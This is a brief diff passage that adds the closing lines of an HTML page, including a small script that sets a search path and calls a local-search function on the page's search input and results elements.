+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
